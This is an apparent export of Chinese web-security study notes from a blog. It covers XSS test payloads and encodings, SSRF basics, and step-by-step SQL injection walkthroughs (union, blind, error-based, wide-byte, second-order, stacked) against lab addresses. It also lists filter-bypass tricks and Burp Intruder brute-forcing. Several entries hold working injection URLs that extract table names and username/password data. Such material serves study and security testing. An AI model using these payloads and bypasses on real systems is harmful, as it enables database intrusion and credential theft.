    <content type="text"><![CDATA[XSS常见测试语句：&lt;scrip&gt;alert(/xss/)&lt;/scrip&gt; &lt;img src=x onerror=alert(/xss/)&gt; &lt;svg onload=alert(xss/)&gt; &lt;a href=javascript:alert(/xss/)&gt; 常见编码方式：1、JS编码：JS提供了四种字符编码的策略， 三个八进制数字，如果个数不够，在前面补0，列如:”e”的编码为“\145”. 两个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\x65”. 四个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\u0065” 对于一些控制字‘符，使用特殊的C类型的转义风格（例如\n和\r） 2、HTML 实体编码：命名实体：以&amp;开头，以分号结尾的，列如“&lt;”的编码是“&amp;lt“. 字符编码：十进制，十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值；“， 列如“&lt;“ 可以编码为”&#060;“和 ”&amp;#x3c；“ 3、URL 编码这里的URL编码，也是两次URL全编码的结果。如果alert被过滤， 结果为:%25%36%31%25%36%43%25%36%35%25%37%32%25%37%34 在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。 XSS漏洞修复建议因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种。 过滤输入的数据，包括““” “&lt;“ “&gt;” “on”等非法字符。 对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript 编码等。 参考（侵删）：https://www.freebuf.com/articles/web/153055.html 在线生成js代码网站:https://xsshs.cn/xss.php]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS基础知识]]></title>
    <url>%2F2019%2F08%2F09%2FXSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[XSS概念：XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为XSS，主要危害是盗取用户信息，钓鱼，制造蠕虫等。 黑客通过HTML注入篡改了网页，插入了恶意脚本，从而在用户浏览网页时，实现控制用户浏览器行为的一种攻击方式。 黑客可以利用XSS盗取用户cookie，有了用户的cookie，可以使用用户的身份来正常访问站点。 XSS属于客户端代码注入，通常注入代码是JavaScript，区别于命令注入，SQL注入属于服务端代码注入。 判断是否存在XSS：可以通过输入构造的JavaScript代码，看页面是否能够弹出构造的弹窗。 例：&lt;script&gt;alert(123)&lt;/script&gt; ​ &lt;image src=&quot;&quot; onerror=&quot;alert(&#39;123&#39;)&quot;&gt; ​ XSS分类：XSS根据效果的不同，可以分为反射型XSS，存储型XSS。DOM型XSS 1、反射型XSS：反射型XSS又称为非持久性XSS。 攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 2、存储型XSS：存储型XSS又称为持久性XSS，攻击脚本将被永久地存放在服务器的数据库或文件中，具有很高的隐蔽性。 攻击方式：这种攻击多见于论坛，博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。 3、DOM型XSS：DOM 型xss其实是一种特殊类型的反射型xss它是基于DOM文档对象模型的一种漏洞。 攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在XSS漏洞。 *三种不同类型的XSS之间的区别： XSS常见攻击：盗取cookie 获得位置信息 …… 参考（侵删）:https://blog.csdn.net/extremebingo/article/details/81176394]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF]]></title>
    <url>%2F2019%2F08%2F09%2FSSRF%2F</url>
    <content type="text"><![CDATA[SSRF概念：SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） SSRF漏洞产生原因：SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。 首先，我们要对目标网站的架构了解。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。 所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。 正常用户访问网站的流程是：输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应。 那网站有个请求是www.baidu,com/xxx.php?image=URL 那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性。 产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据。 例如：www.baidu.com/xxx.php?image=www.abc.com/1.jpg 如果我们将www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码 终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。 SSRF用途：*内外网的端口和服务扫描 *主机本地敏感数据的读取 *内外网主机应用程序漏洞利用 *内外Web站点漏洞的利用 SSRF漏洞的寻找：*通过URL地址分享网页内容 *转码服务 *在线翻译 *通过URL地址加载或下载图片 *图片，文章收藏功能 *未公开的api实现以及其他调用URL功能 *从URL关键字中寻找 ​ 如：share，wap，url，link，src，source，target，u，3g，display，sourceURL，imageURL，domain…… SSRF漏洞验证方法：*因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器端发送的，从而判断是否存在SSRF漏洞 *在页面源码中查找访问的资源地址，如果该资源地址类型为www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞 参考（侵删）：https://www.jianshu.com/p/d1d1c40f6d4c]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[时间盲注]]></title>
    <url>%2F2019%2F08%2F09%2F%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[例：http://172.16.13.53/web/time.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断注入点及类型：http://172.16.13.53/web/time.php?id=1 and sleep(5) *通过页面响应时间判断存在哪种类型的注入 判断数据库长度：http://172.16.13.53/web/time.php?id=1 and if(length(database())&gt;=1,sleep(3),1) *if结构：if（x,y,z），若满足条件x，则执行y，否则执行z 爆库名：http://172.16.13.53/web/time.php?id=1 and if(substr(database(),1,1)=’t’,sleep(5),1) *此处及以下操作需用到Burp，参考SQL注入基本知识-利用Burp进行盲注 爆表名：http://172.16.13.53/web/time.php?id=1 and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1) 爆字段名：http://172.16.13.53/web/time.php?id=1 and if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1) 爆数值：http://172.16.13.53/web/time.php?id=1 and if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1) 要点：*if结构语句的含义：if（x,y,z），若满足条件x，则执行y，否则执行z *从爆库开始，后面的操作需借助Burp]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[联合注入]]></title>
    <url>%2F2019%2F08%2F09%2F%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://127.0.0.1/web/union.php?id=1 *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断字段数：http://127.0.0.1/web/union.php?id=1 order by 1-99 查看数据回显位置：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,4,5,6 爆库名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,database(),5,6 爆表名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),5,6 爆字段名：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’test’ and TABLE_NAME=’users’),5,6 爆数值：http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(username,password) from test.users),5,6 要点：*若在查看回显位置时页面没有返回值，说明回显的数据没有地方存放，应该把id变成-1，以便回显数值，之后的操作同理。 *联合注入只能执行查询语句 *这里查询时因为有多个语句，所以用group-concat，这个语句的作用就是将所有的查询结果打包，以字符串的形式输出。还可以用limit进行逐个输出]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宽字节注入]]></title>
    <url>%2F2019%2F08%2F09%2F%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://192.168.11.128/web/kuanzifu.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库字段数：http://192.168.11.128/web/kuanzifu.php?id=1%df&#39; order by 6–+ *此处的%df的作用是绕过转义，具体见文末 查看数据回显位置：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,2,3,4,5,6–+ 爆库名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(database()),3,4,5,6–+ 爆表名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6–+ *此处不直接跟数据库名的原因是，单引号’会被转义，会导致查询出错，所以在数据库名的位置再嵌入一次查询 爆字段名：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=((select table_name from information_schema.tables where table_schema=database() limit 0,1))),3,4,5,6–+ *此处内嵌的查询表名语句只能用limit，不能用group_conat，因为此时是读取单个表，相当于table_name=’users’,这里table_name只能有一个表，不能同时有多个表 爆值：http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39; union select 1,(select group_concat(id) from test.users),3,4,5,6–+ 要点（SQL注入绕过技巧之宽字节注入）：*宽字节注入，它的作用可以绕过转义，也是绕过转义的其中一个办法 *宽字节注入源于设置MySQL连接时错误配置为：set character_set_client=gbk；这样配置会引发编码转换从而导致的注入漏洞。(GBK导致的问题) *当GPC开启(php.inimagic_quotes_gpc = On)或使用addslashes函数过滤提交的参数时，测试注入点使用的单引号 ‘ 就会被转义为: \’，这个的作用就是对敏感函数的转义，让我们无法注入。 *如果存在宽字节注入，我们输入%df%27时首先经过上面提到的转义就会变成%df%5c%27(%5c就是反斜杠)。之后再数据库查询由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字，然后MySQL服务器会对查询语句进行了GBK编码%df%5c转换成汉字，而单引号逃出了，这个时候就可以注入了。 *%df不是固定的，可以自己组合。只要是汉字就可以。在mysql中，用于转义（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。 *GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二次注入]]></title>
    <url>%2F2019%2F08%2F09%2F%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://192.168.11.128/web/double1.php（注册页面） ​ http://192.168.11.128/web/double2.php（查询页面） **判断注入点及类型，见SQL注入基本知识-判断注入类型（查询页面进行） 在注册页面传入非法字符：http://192.168.11.128/web/double1.php?username=zr&#39; *这里的zr’注册之后会传进数据库储存，查询之后就会构造出一个语句 *注册完成后会在页面返回一个id值，用这个值在查询页面执行语句 在查询界面输入id进行查询：http://192.168.11.128/web/double2.php?id=6 *这里和普通的判断注入类型类似，只不过是先把构造语句放入数据库，再让他读取出来进行执行 查询字段数：http://192.168.11.128/web/double1.php?id=zr&#39; order by 5–+ http://192.168.11.128/web/double2.php?id=7 *和上面一样，将构造语句写入数据库，然后再从id读出，执行语句 查看数据回显位置：http://192.168.11.128/web/double1.php?id=zr&#39; union select 1,2,3–+ http://192.168.11.128/web/double2.php?id=8 爆库名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(database()),3–+ http://192.168.11.128/web/double2.php?id=9 爆表名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),3–+ http://192.168.11.128/web/double2.php?id=10 爆字段名：http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),3–+ http://192.168.11.128/web/double2.php?id=11 爆数值:http://192.168.11.128/web/double1.php?username=zr&#39; union select 1,(select group_concat(id) from test.users),3–+ http://192.168.11.128/web/double2.php?id=12 要点：*二次注入的原理就是，将构造语句传入数据库并储存，然后查询时语句就会被执行 *这里的注册页面没有输入框，直接使用的是url，若注册页面有输入框，就不用再url里面注册，直接在注册框注册即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆叠注入]]></title>
    <url>%2F2019%2F08%2F09%2F%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://192.168.11.128/web/duidie.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库长度：http://192.168.11.128/web/duidie.php?id=1;select if(length(database())&gt;=1,sleep(5),1) *这里堆叠注入采用了时间盲注，可见；后面语句和时间盲注并无差别 爆库名：http://192.168.11.128/web/duidie.php?id=1;select if(substr(database(),1,1)=’t’,sleep(5),1) *爆库名这里和盲注一样，使用Burp 爆表名：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1) 爆字段名：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1) 爆数值：http://192.168.11.128/web/duidie.php?id=1;select if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1) 要点：*分号；在数据库中表示一个语句结束，分号结束后再构造一条语句就表示堆叠注入 *此处是采用的时间盲注进行的，视具体情况而定 *堆叠注入相比联合注入，它能执行任何数据库语句，而联合注入只能执行查询语句]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[布尔盲注]]></title>
    <url>%2F2019%2F08%2F09%2F%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[例：http://172.16.13.55/web/boolean.php?id=1 *判断注入点及类型，见SQL注入基本知识-判断注入类型 判断数据库长度：http://172.16.13.55/web/boolean.php?id=1&#39; and length(database())&gt;=4–+ *此处为了判断数据库名的长度，如数据库为test，则长度为4 爆库名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr(database(),1,1)=’a’–+ *substr为数据库的一种函数，它的作用是从一个字符串截取一部分返回。 *database()后面的1,1表示这个字符串的第一个字符，2,1表示第二个字符。 *此语句执行一次只能判断一个字符，需要结合Burp狙击手来爆破。 爆表名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+ *limit 0,1表示从第几个字符串开始。例如，数据库中依次有person，user，password 三个表，0,1表示从person开始读取，1,1就表示从user读取。 爆字段名：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+ 爆数值：http://172.16.13.55/web/boolean.php?id=1&#39; and substr((select id from test.users limit 0,1),1,1)=’a’–+ 要点：*当判断页面注入类型时，若页面只返回正确和错误，不返回报错信息时，只能采用盲注的方式。 *盲注执行一次代码判断的是一个字符，手工输入很消耗精力，需要用到Burp的狙击手来帮助，使用方式见SQL注入基本知识-利用Burp进行盲注。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[报错注入]]></title>
    <url>%2F2019%2F08%2F09%2F%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://172.16.13.53/web/error.php *判断注入点及类型，见SQL注入基本知识-判断注入类型 爆库名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(database()),0x7e),1)–+ *updatexml语法格式为以上形式 *0x7e转义过来是波浪符号~ 爆表名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),0x7e),1)–+ 爆字段名：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),0x7e),1)–+ 爆数值：http://172.16.13.53/web/error.php?username=a&#39; and updatexml(1,concat(0x7e,(select group_concat(username,password) from test.users ),0x7e),1)–+ 要点：*报错注入的条件是页面能返回报错的信息，能从报错信息中得到有用信息]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入绕过技巧]]></title>
    <url>%2F2019%2F08%2F09%2FSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[大小写绕过：此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 例如：id=1 UNion SElecT 1,2,3 替换关键字：这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过。 例如：id=1 UNIunionON SELselectECT 1,2,3 空格绕过：有些情况SQL会过滤空格，使得空格无法生效，可以用一下方式绕过。 例如： id=1/**/union/**/select/**/1,2,3 //用/**/代替空格 id=1%0aunion%a0select%a01,2,3 //用%0a(回车)代替空格 id=1()union()select()1,2,3 //用()代替空格 …… 引号绕过（用16进制）：会使用到引号的地方一般是在最后的where子句中，如select column_name from information_schema.tables where table_name=’users’ 将’users’转变为16进制为0x7573657273 逗号绕过：在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。 使用from for绕过（substr()和mid()可以使用)：例：id=1 and substr(database(),1,1)=’a’ ​ id=1 and substr(database() from 1 for 1)=’1’ 使用join绕过：union select 1,2等价于union select * from (select 1)a join (select 2)b 使用like：select ascii(mid(user(),1,1))=80等价于select user() like ‘r%’ 对于limit可以使用offset来绕过：select * from news limit 0,1等价于select * from news limit 1 offset 0 比较符号绕过（’&gt;’,’&lt;’,’=’）：同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 用greatest，least代替大于小于符号：例：id=1 and length(database())&gt;2 ​ id=1 and greatest(length(database()),2)=2 ​ *greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 使用between and：*between a and b：返回a，b之间的数据，不包含b。 绕过等号：使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; or and xor not绕过：有些时候SQL会过滤上述的关键字，导致输入的关键字不能执行。 使用大小写、替换关键字绕过：id=1 and 1=1等价于id=1 aandnd 1=1 id=1 and 1=1等价于id=1 ANd 1=1 使用字符代替：or=|| and=&amp;&amp; xor=| not=! 注释符号绕过：一般常用注释符号有#，–+，– ，– -等，但是SQL如果过滤了这些注释符，就会使得注释无效。 例：id=1’ union select 1,2,3 id=1’ union select 1,2,3||’1或者id=1’ union select 1,2,’3 *单引号的作用是将后面的单引号闭合掉 内联绕过：例如，一个函数过滤了select关键字，双写，大小写等方法都不奏效，这时可以使用内联绕过。 id=1 union select 1,database(),3 这里可以用/*!select*/代替select，/*！*/中的内容将强制执行 通用编码绕过：如URLEncode编码，ASCII,HEX,unicode编码绕过： or 1=1即为%6f%72%20%31%3d%31 等价函数绕过：SQL若过滤了每个函数导致函数不能使用，可以寻找它的等价函数来替代当前函数。 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() 宽字节注入：过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。 在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路。 1、%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id=-1%df%27union select 1,user(),3–+ 2、将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。 一般产生宽字节注入的PHP函数： 1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \ 转为 \，将 “ 转为 &quot; 。用思路一。 2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符：\x00 \n \r \ ‘ “ \x1a （防御方法，将mysql编码方式设置为gbk即可）]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入基本知识]]></title>
    <url>%2F2019%2F08%2F09%2FSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[例：http://127.0.0.1/web/union.php?id=1 SQL注入概念：所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 SQL注入原理：SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面： ①不当的类型处理； ②不安全的数据库配置； ③不合理的查询集处理； ④不当的错误处理； ⑤转义字符处理不合适； ⑥多个提交处理不当。 判断注入类型（整型）：id=1 页面正常 id=1 and 1=1 页面正常 id=1 and 1=2 页面报错 *从以上三个条件可以判断该页面存在sql注入，并且为整型 判断注入类型（字符型）： id=1 页面正常 id=1 and 1=1 页面正常 id=1 and 1=2 页面正常 id=1’ and 1=1# 页面正常 id=1’ and 1=2# 页面报错 *从以上五个条件可以判断该页面存在sql注入，并且为字符型 判断注入类型（时间盲注）：*时间盲注在任何时候不会报错，也不会出现任何有用信息 *id=1’ and sleep(5) –+：若页面响应时间延迟，可以判断存在哪种注入 常用注释符：#，–+，– ，– -等，或者可以将字符转换成对应的URL 利用Burp进行盲注：布尔盲注指页面只返回true和false两个结果，并没有返回报错等有用信息 以爆破数据库为例：1’ and substr(database(),1,1)=’a’–+ 1、用Burp进行拦截抓包 2、右键-发送给测试器 3、清除§-添加§ ​ *清除§之后，添加的位置为要变动的值，如上面的’a’ 4、有效载荷-从列表中添加 ​ *字典除了Burp自带的一些简单字典外，还可以选择外部的字典。 5、开始攻击 ​ *攻击会自动遍历字典里的值，正确的值在返回的字符长度上和错误值不相同，这样就可以确认具体字符。 ​ *若是时间盲注，正确和错误信息返回的长度都是一样的，此时需要看数据返回时间，具体操作：列-接收响应计数。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie注入]]></title>
    <url>%2F2019%2F08%2F09%2FCookie%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://172.16.13.29/web/cookie.php 利用Burp抓包：*抓包后发送到重发器，然后在重发器的cookie值后面构造语句 在重发器中构造语句:*这里和其他注入方式一样，只不过语句是在Burp的重发器中构造的 要点：*cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。 *相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。另外cookie注入的形成有两个必须条件，条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BASE64注入]]></title>
    <url>%2F2019%2F08%2F09%2FBase64%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[例：http://172.16.13.29/web/base64.php 语句编码：*base64注入的原理是将构造语句进行base64编码，例如id=1，这里把等号后面的内容变成Base64的编码方式，意思就是1→MQ==，在整个注入过程的构造语句都编码成Base64，视具体情况，还可编码成url等其他编码方式。 *注入过程与其他主流的注入方式相同。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML基础]]></title>
    <url>%2F2019%2F08%2F09%2FHTML%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[HTML基本介绍概念：HTML是超文本标记语言，不是传统定义的编程语言，又是一种标准结构化语言。 HTML是构建我们一个标准的网页标准语言，它定义一套严格标签、内容、方法等规范。 基本格式：&lt;input name =&#39;zhangsan&#39; id=&#39;username&#39; value=&#39;&#39; onchange=&#39;javascript:;&#39;&gt; &lt;/input&gt; &lt;标签 属性名=&#39;属性值&#39; onclick onxxx=方法&gt;内容（元素）&lt;/标签&gt; 发展历史：HTML发展了5代，目前兼容或运行的HTML（4-5），浏览器多为双核心浏览器（高速：webkit/兼容：IE/Edge） 基本组成： HTML和Head是系统级，不显现，Head中的内容是可对影响的浏览器本身的，它具有对浏览器的控制权限，只有Body才会显现。 优先级：HTML&gt;Head&gt;Body&gt;元素 HTML：网页基础结构，必不可少，如果不写，浏览器在渲染时会自动补全，该标签具有很高的优先级，因此会多跟浏览器本身的可视区域形成一种关联关系。 Head：网页基础结构的组成标签，原则上不可少，有些浏览器不会自动补全该标签，该标签的优先级受限于HTML。 Body：网页基础结构的组成标签，原则上可以不写，但是一定会自动不全该标签,他的可视区域受限于HTML。 浏览器两个基本组件：一个解释器（告诉浏览器标签的作用和级别），一个渲染器（转化成UI界面）。 HTML版本/规范：HTML 1991 HTML+ 1993 HTML 2.0 HTML 3.0 HTML 4.0 （不存在） HTML 4.01 1999 XHTML 1.0（微软） 2000 HTML 5 2012 XHTML 5（微软） 2013 识别HTML版本/规范方法：声明HTML的版本/规范声明没有具体的大小写要求，可以全大写也可以全小写HTML 5: HTML 4.01: XHTML 1.0: 微软与W3C之争：争夺规范和话语权，微软是在W3C基础上增加了自己的一些内容：自有标签库/方法库/属性库。还增加了浏览器的解释和渲染的规范和话语权：IE5/6（HTML&lt;4.01） IE7/8/9（HTML&gt;4.01&lt;XHTML1.0） IE10/11(HTML5/XHTML5)浏览器的份额发生变化导致微软的IE份额下滑，最后是由苹果和谷歌联合推动webkit内核胜利。 Head区域：Meta标签是头功能定义：定义编码/缩放比例Title 页面标题定义，也是唯一一个可以直观感受到HTMLScript 脚本Style 样式Link 引用标签 Body区域：各类Tags按功能划分： ​ 1、容器标签：常用的div，p，span​ 2、内容标签：常用的div，p，span，input，textarea，video，audio，img​ 3、交互标签: 常用的input，button，a标签的套路（规则） ​ 标准写法：&lt;标签名 属性 方法&gt;&lt;/标签名&gt; ​ 简易写法：&lt;标签名 内容属性支持/&gt; ​ 标签名：A-Z（百度html标签） ​ div特性：独占一行(width：100%)，没有行高（height：0/none）， 没有边框（border：0/none）…… 属性： 通用标签：id name style class width height data 特有标签：src rel value 自定义：多配合JS用 方法：可以通过关键字this来获得安全列表 安全问题：有一些安全事件是采用改变或拦截标签后给它赋予一些方法，来获得内容 